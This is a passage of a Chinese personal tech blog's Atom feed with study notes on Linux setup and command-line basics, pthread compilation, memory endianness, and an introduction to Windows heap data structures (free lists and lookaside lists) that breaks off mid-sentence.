&lt;h1 id=&quot;堆溢出利用上-dword-shoot&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot;</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="堆" scheme="https://www.rgzzplus.com/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>使用linux时的问题总结</title>
    <link href="https://www.rgzzplus.com/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>https://www.rgzzplus.com/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2022-04-10T06:39:47.000Z</published>
    <updated>2022-04-17T06:23:08.055Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="vim-etc-写入时-出现-e121无法打开并写入文件"><a class="markdownIt-Anchor" href="#vim-etc-写入时-出现-e121无法打开并写入文件"></a> vim /etc 写入时 出现 E121:无法打开并写入文件</h1><p><strong>解决方案：</strong></p><ol><li>保存的时候用:w !sudo tee %</li><li>输入密码，即可</li></ol><h1 id="安装中文输入法"><a class="markdownIt-Anchor" href="#安装中文输入法"></a> 安装中文输入法</h1><h2 id="安装步骤"><a class="markdownIt-Anchor" href="#安装步骤"></a> 安装步骤</h2><p>1.更新源文件，使用的是阿里云源</p><p>打开<strong>sources.list</strong>文件</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>复制源地址到文本中</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>更新安装源</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><p>2.下载IBus完后重启系统</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ibus</span><br><span class="line">apt-get install ibus-pinyin</span><br><span class="line">reboot //重启</span><br></pre></td></tr></table></figure><p>3.IBus配置<br>鼠标右键选择设置(setting)&gt;区域和语言(Region&amp;Language),在输入源中添加汉语（PinYin），可通过搜索PinYin找到。</p><h1 id="linux-编程"><a class="markdownIt-Anchor" href="#linux-编程"></a> Linux 编程</h1><h2 id="gcc-多线程编译失败"><a class="markdownIt-Anchor" href="#gcc-多线程编译失败"></a> gcc 多线程编译失败</h2><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220403144624296-16501645035061.png" alt="image-20220403144624296"></p><p>今天写一个线程的程序，已经在c文件中包含了线程的头文件&lt;pthread.h&gt;，可是编译的时候却报错“对pthread_create未定义的引用“，原来时因为 pthread库不是Linux系统默认的库，连接时需要使用库libpthread.a,所以在使用pthread_create创建线程时，在编译中要加-lpthread参数:gcc createThread.c -lpthread -o createThread. 加上这个以后编译成功！</p><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220403144755741-16501645035062.png" alt="image-20220403144755741"></p><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220403152451357-16501645035064.png" alt="image-20220403152451357"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">//线程创建相关函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> tid;   <span class="comment">//创建线程 ID</span></span><br><span class="line"></span><br><span class="line">pthread_create(&amp;tid, <span class="literal">NULL</span>,  threadFunc, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    线程创建函数，参数列表:</span></span><br><span class="line"><span class="comment">    1.  线程 ID 地址</span></span><br><span class="line"><span class="comment">    2.  线程 属性</span></span><br><span class="line"><span class="comment">    3.  线程 函数地址</span></span><br><span class="line"><span class="comment">    4.  线程 传递给线程函数的参数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">pthread_join(tid, <span class="literal">NULL</span>);   <span class="comment">//等待指定的线程结束</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line">&#123;<span class="comment">//统计程序运行时间</span></span><br><span class="line"></span><br><span class="line"><span class="type">clock_t</span> start,delta;</span><br><span class="line"><span class="type">double</span> time_used;<span class="comment">//程序开头加上这两行代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序变量在这里定义</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">start = clock();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">程序执行代码放在这里</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">delta = clock() - start;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The time taken in total : %lf seconds\n&quot;</span>,(<span class="type">double</span>)delta/CLOCKS_PER_SEC); <span class="comment">//程序末尾输出运行时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//统计程序时间，除了在代码中统计外，还能再运行程序前加上 [time ./程序名] ,让系统去统计</span></span><br></pre></td></tr></table></figure><h2 id="互斥锁"><a class="markdownIt-Anchor" href="#互斥锁"></a> 互斥锁</h2><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220404145450778-16501645035063.png" alt="image-20220404145450778"></p><h2 id="信号量"><a class="markdownIt-Anchor" href="#信号量"></a> 信号量</h2><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220404195520172-16501645035065.png" alt="image-20220404195520172"></p><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220405143220745-16501645035066.png" alt="image-20220405143220745"></p><p><img src="/2022/04/10/%E4%BD%BF%E7%94%A8linux%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/image-20220405143628664-16501645035067.png" alt="image-20220405143628664"></p><blockquote><p>参考：<a href="https://www.bilibili.com/video/BV1bf4y147PZ?p=1">《操作系统原理及Linux实践》</a></p></blockquote></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;vim-etc-写入时-出现-e121无法打开并写入文件&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#vim-etc-写入时-出现-e121无法打开并写入文件&quot;&gt;&lt;/a&gt; vim /etc 写入时 出现 E1</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="linux问题" scheme="https://www.rgzzplus.com/tags/linux%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>linux命令行</title>
    <link href="https://www.rgzzplus.com/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    <id>https://www.rgzzplus.com/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/</id>
    <published>2022-04-10T06:37:19.000Z</published>
    <updated>2022-04-10T06:42:17.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="apt-软件包管理服务"><a class="markdownIt-Anchor" href="#apt-软件包管理服务"></a> apt 软件包管理服务</h1><p>apt命令负责安装，更新，删除和管理基于Ubuntu和Debian的系统的软件包。</p><h2 id="安装软件包"><a class="markdownIt-Anchor" href="#安装软件包"></a> 安装软件包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt install [package name1] [package-name2] [package-name3]</span><br></pre></td></tr></table></figure><h2 id="卸载软件包"><a class="markdownIt-Anchor" href="#卸载软件包"></a> 卸载软件包</h2><p>这是使用apt命令从我们的系统中删除程序或服务的语法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt remove [package name]</span><br></pre></td></tr></table></figure><p>但是，即使已删除软件包，在安装的软件包中也会有一些孤立的文件。 在这种情况下，您可以使用“清除清除”选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt --purge remove [package-name]</span><br></pre></td></tr></table></figure><h3 id="自动删除孤立的软件包"><a class="markdownIt-Anchor" href="#自动删除孤立的软件包"></a> 自动删除孤立的软件包</h3><p>删除软件包时，仅删除关键的依赖项。 其余的留在我们的系统中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure><p>上面的命令将从系统中卸载所有孤立的软件包。 这包括已安装为依赖项且不再需要的任何软件包。</p><h2 id="更新apt存储库"><a class="markdownIt-Anchor" href="#更新apt存储库"></a> 更新APT存储库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>它检查在线存储库，并将所有更新的软件包下载到本地存储库。</p><h3 id="升级系统软件包"><a class="markdownIt-Anchor" href="#升级系统软件包"></a> 升级系统软件包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>这将扫描系统上所有已安装的软件包，并找到在旧版本上运行的程序或服务。 接下来，它将所有此类程序和服务升级到最新的可用版本。</p><p>这是必不可少的命令，因为它使您可以使用单个命令来启动系统范围的升级。</p><p>但是上面的命令只会升级非关键软件包。 如果有可用的内核更新，则需要使用以下命令执行完整的系统升级：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">sudo apt full-upgrade</span><br></pre></td></tr></table></figure><p>上面的命令将升级Linux内核以及所有未使用先前命令升级的系统关键软件包。 全面升级后，通常需要重新启动，以便启动新内核。</p><h2 id="搜索包"><a class="markdownIt-Anchor" href="#搜索包"></a> 搜索包</h2><p><em>apt search</em>命令是用于在Ubuntu上搜索软件包的最常用命令。 它旨在搜索包名称及其元数据，例如描述，依赖项，源和版本。</p><p>该命令返回名称或元数据与指定搜索关键字匹配的所有软件包。 以下是使用apt search命令搜索软件包的语法。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search [keyword]</span><br></pre></td></tr></table></figure><h1 id="探索-linux-系统"><a class="markdownIt-Anchor" href="#探索-linux-系统"></a> 探索 Linux 系统</h1><h2 id="选项与参数"><a class="markdownIt-Anchor" href="#选项与参数"></a> 选项与参数</h2><p>大多数命令格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> -options arguments</span><br></pre></td></tr></table></figure><p>-options</p><ul><li>-l用于产生长格式的输出结果</li><li>-t    用于按修改时间顺序对输出结果排序</li><li>–reverse    以降序排列输出结果</li></ul><h2 id="显示当前工作目录名称"><a class="markdownIt-Anchor" href="#显示当前工作目录名称"></a> 显示当前工作目录名称</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><h2 id="更改当前工作目录"><a class="markdownIt-Anchor" href="#更改当前工作目录"></a> 更改当前工作目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> [绝对路径/相对路径]</span><br></pre></td></tr></table></figure><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_190859.jpg" alt="cd便捷写法"></p><h2 id="列出目录内容"><a class="markdownIt-Anchor" href="#列出目录内容"></a> 列出目录内容</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><h3 id="ls-命令选项"><a class="markdownIt-Anchor" href="#ls-命令选项"></a> ls 命令选项</h3><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191623.jpg" alt="ls 命令选项"></p><h3 id="进一步了解长格式"><a class="markdownIt-Anchor" href="#进一步了解长格式"></a> 进一步了解长格式</h3><p>ls -l 后的输出</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/image-20220331192208724.png" alt="ls -l 后的输出"></p><p>不同字段的含义：</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191655.jpg" alt="不同字段的含义"></p><h2 id="使用-file-命令确定文件类型"><a class="markdownIt-Anchor" href="#使用-file-命令确定文件类型"></a> 使用 file 命令确定文件类型</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file filename</span><br></pre></td></tr></table></figure><h2 id="使用-less-命令查看文本文件"><a class="markdownIt-Anchor" href="#使用-less-命令查看文本文件"></a> 使用 less 命令查看文本文件</h2><p>less 命令进入文本后常用命令</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191718.jpg" alt="less"></p><h2 id="复制粘贴技巧"><a class="markdownIt-Anchor" href="#复制粘贴技巧"></a> 复制粘贴技巧</h2><p>使用鼠标，双击可以复制文件名，单击中键可以将其粘贴到命令中。</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191804_edit_460972879994762.jpg" alt="系统目录"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_191837_edit_461000882512987.jpg" alt="IMG_20220331_191837_edit_461000882512987"></p><h2 id="符号链接"><a class="markdownIt-Anchor" href="#符号链接"></a> 符号链接</h2><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/image-20220331201930857.png" alt="image-20220331201930857"></p><p>第一个字母是 L ，表示一种特殊的文件叫符号链接（也叫软链接），在Unix中，一个文件可以被多个名称引用。</p><h1 id="操作文件和目录"><a class="markdownIt-Anchor" href="#操作文件和目录"></a> 操作文件和目录</h1><h2 id="通配符"><a class="markdownIt-Anchor" href="#通配符"></a> 通配符</h2><p>通配符，帮助快速指定一组文件名。</p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_202606_edit_464545823869217.jpg" alt="通配符及其含义"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_202615_edit_464532576105157.jpg" alt="常用字符类"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_202628.jpg" alt="通配符示例"></p><h2 id="mkdir创建目录"><a class="markdownIt-Anchor" href="#mkdir创建目录"></a> mkdir—创建目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> directory...</span><br></pre></td></tr></table></figure><h2 id="cp复制文件和目录"><a class="markdownIt-Anchor" href="#cp复制文件和目录"></a> cp—复制文件和目录</h2><p>将单个文件或目录 item1 复制到文件或目录 item2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> item1 item2</span><br></pre></td></tr></table></figure><p>将多个文件或目录 item 复制到目录 directoty 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> item... directory</span><br></pre></td></tr></table></figure><p><strong>有用的选项和示例</strong></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_203549_edit_464995287133211.jpg" alt="cp命令常用选项"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_203556_edit_464985633861337.jpg" alt="cp命令示例"></p><h2 id="mv移动和重命名文件"><a class="markdownIt-Anchor" href="#mv移动和重命名文件"></a> mv—移动和重命名文件</h2><p>将文件或目录 item1 移动或重命名为 item2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> item1 item2</span><br></pre></td></tr></table></figure><p>将一个或多个 item 从一个目录移动到另一个目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> item... directory</span><br></pre></td></tr></table></figure><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_204251_edit_465337159433680.jpg" alt="mv命令选项"></p><p><img src="/2022/04/10/linux%E5%91%BD%E4%BB%A4%E8%A1%8C/IMG_20220331_204334_edit_465371086991487.jpg" alt="mv命令示例"></p><h1 id="未完待续"><a class="markdownIt-Anchor" href="#未完待续"></a> 未完待续。。。</h1><blockquote><p>参考：《linux命令行大全》  第二版</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;apt-软件包管理服务&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#apt-软件包管理服务&quot;&gt;&lt;/a&gt; apt 软件包管理服务&lt;/h1&gt;
&lt;p&gt;apt命令负责安装，更新，删除和管理基于Ubuntu和Debian的系统的软件包。&lt;/p&gt;</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="linux命令行大全" scheme="https://www.rgzzplus.com/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内存的大小端问题</title>
    <link href="https://www.rgzzplus.com/2022/04/10/%E5%86%85%E5%AD%98%E7%9A%84%E5%A4%A7%E5%B0%8F%E7%AB%AF%E9%97%AE%E9%A2%98/"/>
    <id>https://www.rgzzplus.com/2022/04/10/%E5%86%85%E5%AD%98%E7%9A%84%E5%A4%A7%E5%B0%8F%E7%AB%AF%E9%97%AE%E9%A2%98/</id>
    <published>2022-04-10T06:28:47.000Z</published>
    <updated>2022-04-10T06:31:46.423Z</updated>
    
    <content type="html"><![CDATA[<p>大小端问题，也就是寻址和字节存储顺序问题</p><p>大端法 (big   endian )：最高有效字节在最前面</p><p>小端法 (little endian )：最低有效字节在最前面</p><p>如果我们从左向右读字符，并且内存增加方向也随着向右增大，那么大端法存储与我们读的顺序一致，如下图</p><p><img src="/2022/04/10/%E5%86%85%E5%AD%98%E7%9A%84%E5%A4%A7%E5%B0%8F%E7%AB%AF%E9%97%AE%E9%A2%98/image-20220408212352408.png" alt="大小端"></p><p>大多数Intel兼容机都只用小端模式。</p><blockquote><p>参考：《深入理解计算机系统》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;大小端问题，也就是寻址和字节存储顺序问题&lt;/p&gt;
&lt;p&gt;大端法 (big   endian )：最高有效字节在最前面&lt;/p&gt;
&lt;p&gt;小端法 (little endian )：最低有效字节在最前面&lt;/p&gt;
&lt;p&gt;如果我们从左向右读字符，并且内存增加方向也随着向右增大，那么大端</summary>
      
    
    
    
    <category term="操作系统" scheme="https://www.rgzzplus.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="内存大小端" scheme="https://www.rgzzplus.com/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>堆的工作原理</title>
    <link href="https://www.rgzzplus.com/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
    <id>https://www.rgzzplus.com/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</id>
    <published>2022-04-10T06:27:47.000Z</published>
    <updated>2022-04-21T06:24:36.074Z</updated>
    
    <content type="html"><![CDATA[<p>PS：如果您熟悉堆的工作原理，建议您跳过堆的介绍部分，直接看堆溢出原理</p><h1 id="堆的工作原理"><a class="markdownIt-Anchor" href="#堆的工作原理"></a> 堆的工作原理</h1><h2 id="堆与栈的区别"><a class="markdownIt-Anchor" href="#堆与栈的区别"></a> 堆与栈的区别</h2><p>1、栈 (stack) ，是一种在程序设计时就规定好大小及使用方式的内存，由操作系统自动分配释放，用于存放函数的参数值、局部变量等。栈总是成“线性”变化。栈向低地址空间增长。</p><p>2、堆 (heap)，是一种在程序运行时动态分配的内存，由开发人员分配和释放，若开发人员不释放，程序结束时由OS回收，分配方式类似于链表。堆向高地址增长。</p><p>下图是经典的32位系统内存布局，暂时我们只需要记住栈和堆的增长方向即可，后面实验部分会用到。</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80-16505221641961.png" alt="img-32位系统内存布局"></p><table><thead><tr><th></th><th>堆内存</th><th>栈内存</th></tr></thead><tbody><tr><td>典型用例</td><td>动态增长的链表等数据结构</td><td>函数局部数据</td></tr><tr><td>申请方式</td><td>函数申请，通过返回指针使用，<br>如 p = malloc(8);</td><td>程序中直接声名，<br>如 char buffer[8];</td></tr><tr><td>释放方式</td><td>需要指针传给专用的释放函数，如 free</td><td>函数返回时，由系统自动回收</td></tr><tr><td>管理方式</td><td>需要程序员处理申请与释放</td><td>申请后直接使用，申请与释放由<br>系统自动完成，最后到达栈区平衡</td></tr><tr><td>所处位置</td><td>变化范围很大 0x0012XXXX</td><td></td></tr><tr><td>增长方向</td><td>由内存低地址向高地址排列（不考虑碎片等情况）</td><td>由内存高址向低址增加</td></tr></tbody></table><h2 id="堆的数据结构与管理策略"><a class="markdownIt-Anchor" href="#堆的数据结构与管理策略"></a> 堆的数据结构与管理策略</h2><p>程序员使用堆只做三件事：</p><ul><li>申请一定大小的内存</li><li>使用内存</li><li>释放内存</li></ul><p>堆管理系统响应申请，就意味着要在 “`杂乱无章<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>]” 的内存中 “辨识<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>” 出空闲的内存，“寻找” 一片 “恰当<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>” 的空闲内存区域，以指针的形式返回给程序。</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/IMG_20220409_195211_edit_83875143527305-16495052455141-16505221641972.jpg" alt="img-堆的数据结构"></p><p><code>堆表</code>：堆表一般位于堆区的<code>起始位置</code>，用于索引堆区中所有堆块的重要信息，包括堆块的位置、堆块的大小、空闲还是占用等。堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证堆分配效率的关键。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构,用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。</p><p><code>堆块</code>：出于性能的考虑，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：<code>块首</code>和<code>块身</code>。块首位于一个堆块头部的几个字节，用来标识这个堆块自身的信息，例如，本块的大小、本块空闲还是占用等信息；块身是紧跟在块首后面的部分，也是最终分配给用户使用的数据区。</p><p>堆的内存组织如下图：</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109200726403-1240549290-16505221641973.png" alt="img-堆的内存组织"></p><p>在 Windows 中，占用态<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>的堆块被使用它的程序索引，而堆表只索引所有 空闲态<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup> 的堆块。</p><h3 id="堆表"><a class="markdownIt-Anchor" href="#堆表"></a> 堆表</h3><h4 id="堆表的实现"><a class="markdownIt-Anchor" href="#堆表的实现"></a> 堆表的实现</h4><p>在 Windows 中，堆表实现方法两种：<code>空闲双向链表</code> Free list（简称空表）和<code>快速单向链表</code> Look aside（简称快表）</p><h5 id="空闲双向链表空表"><a class="markdownIt-Anchor" href="#空闲双向链表空表"></a> 空闲双向链表（空表）</h5><p>堆区一开始的堆表区中有一个<code>128</code>项的指针数组，被称做<code>空表索引（Freelist array）</code>。该数组的每一项包括两个指针，用双向链表组织一条空表,如下图。</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109201103609-1511021026-16505221641974.png" alt="img-空闲双向链表"></p><p><code>空表索引</code>的第二项（<code>free[1]</code>）链接了堆中所有大小为<code>8字节</code>的空闲堆块，之后每个索引项链接的空闲堆块大小递增8字节，例如，<code>free[2]</code>链接大小为16字节的空闲堆块，<code>free[3]</code>链接大小为24字节的空闲堆块，<code>free[127]</code>标识大小为1016字节的空闲堆块。因此有：</p><p><strong>空闲堆块的大小＝索引项（ID）×8（字节）</strong></p><p><code>空表索引</code>的第一项（<code>free[0]</code>）所标识的空表相对比较特殊。这条双向链表链接了所有大于等于1024字节的堆块（小于512KB）。这些堆块按照各自的大小在零号空表中升序地依次排列下去.把空闲堆块按照大小的不同链入不同的空表，可以方便堆管理系统高效检索。</p><h4 id="快速单向表快表"><a class="markdownIt-Anchor" href="#快速单向表快表"></a> 快速单向表（快表）</h4><p>快表是 Windows 用来加速堆块分配而采用的一种堆表。这里之所以把它叫做“快表”是因为这类单向链表中从来不会发生堆块合并,快表也有128条，组织结构与空表类似,只是其中的堆块按照<code>单链表</code>组织。快表总是被初始化为空，而且每条快表最多只有4个结点，故很快就会被填满。</p><p>快表结构：</p><p><img src="/2022/04/10/%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/763744-20211109200831038-1026261350-16505221641985.png" alt="img-快表"></p><h3 id="堆中的操作"><a class="markdownIt-Anchor" href="#堆中的操作"></a> 堆中的操作</h3><p>堆中的操作分为三种：堆块分配，堆块释放，堆块合并。（其中 “分配” 和 “释放” 是在程序提交申请时执行的，而堆块合并是由堆管理系统自动完成）</p><h4 id="堆块分配"><a class="markdownIt-Anchor" href="#堆块分配"></a> 堆块分配</h4><p>堆块分配分为三类：</p><ul><li><code>快表分配</code>：找到大小匹配的空闲堆块、将其状态修改为占用态、把它从堆表中“卸下”、最后返回一个指向堆块块身的指针给程序使用；</li><li><code>普通空表分配</code>： 首先寻找最优的空闲块分配，若失败，则寻找次优的空闲块分配<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup>，即最小的能够满足要求的空闲块；</li><li><code>零号空表（free[0]）</code>：先从 